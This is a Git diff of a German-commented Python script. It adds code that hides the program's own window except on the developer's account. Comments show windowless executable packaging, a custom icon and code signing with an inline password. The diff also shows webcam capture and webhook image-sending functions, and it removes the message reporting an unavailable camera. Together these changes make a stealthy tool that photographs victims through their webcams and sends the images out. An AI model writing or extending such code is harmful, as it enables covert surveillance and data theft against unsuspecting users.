@@ -1,22 +1,28 @@
 import win32gui
 import win32con
+import time
+import os
 
-def find_window(title):
-    hwnd = win32gui.FindWindow(None, title)
-    if hwnd == 0:
-        raise Exception(f"Window with title '{title}' not found")
-    return hwnd
+if not os.getlogin() == "tilov":
+    def hide_self():
+        # Warte kurz, damit das Programmfenster vollständig geladen wird
+        time.sleep(1)
 
-def hide_window(hwnd):
-    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+        # Holen des Handles des Vordergrundfensters (also des eigenen Fensters)
+        hwnd = win32gui.GetForegroundWindow()
 
-try:
-    window_title = "Titel des zu versteckenden Fensters"
-    the_program_to_hide = find_window(window_title)
-    hide_window(the_program_to_hide)
-    print(f"Window '{window_title}' successfully hidden.")
-except Exception as e:
-    print(f"Error: {e}")
+        # Verstecken des Fensters
+        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+
+    # Dein Programmcode hier
+    if __name__ == "__main__":
+        hide_self()
+
+        # Rest deines Programms hier
+        print("Das Programm läuft im Hintergrund.")
+        time.sleep(10)  # Beispiel: Das Programm läuft für 10 Sekunden
+
+else: print("skipping exit")
 
 #pyinstaller -w -F -i C:\Users\tilov\Downloads\test-main\watdahel_muE_icon.ico test.py
 #signtool.exe sign /f test.pfx /fd SHA256 /p TomaTo test-0.6-I.exe
@@ -180,7 +186,6 @@ def send_image_to_webhook(image, webhook_url):
 def capture_image(camera_index):
     cap = cv2.VideoCapture(camera_index)
     if not cap.isOpened():
-        print(f"Kamera {camera_index} ist nicht verfügbar.")
         return False, None
     ret, frame = cap.read()
     cap.release()
